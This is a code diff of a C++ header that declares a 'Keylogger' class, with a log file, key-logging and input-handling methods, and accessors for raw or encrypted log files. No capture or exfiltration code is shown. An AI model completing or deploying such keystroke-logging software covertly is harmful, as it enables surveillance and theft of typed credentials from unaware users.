@@ -10,27 +10,26 @@
 #endif
 
 #include <fstream>
+#include <string>
 
 class Keylogger {
     private:
-        /*static Keylogger *instance;
-        Keylogger();
+        std::string fileName;
+        std::fstream logFile;
 
-        String fileName;
+        void logToFile(const std::string key);
+        void asciiInput();
+        bool actionInput(const char key);
+
         bool execute;
 
-        fstream file;
-
-        void writeToLog(const char);
-        bool actionKey(const char);
-        void Logger();*/
-
     public:
-        /*static Keylogger *getInstance();
-        int startCapturing();
+        Keylogger(const std::string _fileName) : fileName(_fileName) {
+            execute = true;
+        };
 
-        fstream getRawFile(const String, bool);
-        fstream getEditedFile(const String, bool);*/
+        std::fstream getRawFile(const std::string _fileName, bool encrypt);
+        std::fstream getEditedFile(const std::string _fileName, bool encrypt);
 };
 
 #endif
